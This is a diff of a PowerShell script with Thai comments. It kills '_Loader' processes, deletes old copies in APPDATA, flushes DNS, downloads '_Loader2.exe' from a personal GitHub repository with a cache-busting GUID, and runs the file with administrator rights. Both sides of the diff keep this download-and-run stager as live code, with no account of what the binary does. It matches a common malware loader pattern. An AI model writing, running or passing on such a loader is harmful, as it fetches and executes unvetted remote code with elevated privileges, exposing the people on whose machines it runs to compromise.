@@ -1,23 +1,30 @@
-# 1. ตั้งค่าตำแหน่งไฟล์ใหม่ (Loader2) และเพิ่ม GUID กัน Cache
-$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe?v=$([guid]::NewGuid())"
-$destPath = "$env:APPDATA\_Loader2.exe"
-
-# 2. สั่งปิดโปรแกรมเก่าที่อาจจะรันค้างอยู่ (ถ้ามี)
+# 1. ปิดโปรแกรมที่อาจรันค้างอยู่
 Stop-Process -Name "_Loader" -ErrorAction SilentlyContinue
 Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue
 
-# 3. ลบไฟล์เก่าทิ้งเพื่อความชัวร์ (ลบทั้งชื่อ Loader และ Loader2)
-if (Test-Path "$env:APPDATA\_Loader.exe") { Remove-Item "$env:APPDATA\_Loader.exe" -Force }
-if (Test-Path $destPath) { Remove-Item $destPath -Force }
+# 2. ลบไฟล์เก่าทิ้งให้หมด (ทั้งตัวเก่าและตัวใหม่ในเครื่อง)
+$oldPath = "$env:APPDATA\_Loader.exe"
+$newPath = "$env:APPDATA\_Loader2.exe"
 
-# 4. ดาวน์โหลดตัวใหม่ล่าสุด
+if (Test-Path $oldPath) { Remove-Item $oldPath -Force -ErrorAction SilentlyContinue }
+if (Test-Path $newPath) { Remove-Item $newPath -Force -ErrorAction SilentlyContinue }
+
+# 3. ล้าง DNS Cache ในเครื่องเผื่อ GitHub ไม่ยอมอัปเดต IP
+ipconfig /flushdns
+
+# 4. ตั้งค่า URL ใหม่ (เพิ่ม GUID ท้ายลิ้งก์เพื่อบังคับโหลดใหม่ 100%)
+$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader2.exe?v=$([guid]::NewGuid())"
+
+# 5. ดาวน์โหลด
 try {
-    Write-Host "Checking System & Downloading Latest Loader..." -ForegroundColor Cyan
-    Invoke-WebRequest -Uri $url -OutFile $destPath
+    Write-Host "Cleaning old files & Downloading latest Loader..." -ForegroundColor Cyan
+    Invoke-WebRequest -Uri $url -OutFile $newPath
 } catch {
-    Write-Host "Connection Error!" -ForegroundColor Red
+    Write-Host "Download Failed!" -ForegroundColor Red
     exit
 }
 
-# 5. รันตัวใหม่ขึ้นมา (Loader2)
-Start-Process -FilePath $destPath -Verb RunAs
+# 6. รันตัวล่าสุดขึ้นมา
+if (Test-Path $newPath) {
+    Start-Process -FilePath $newPath -Verb RunAs
+}
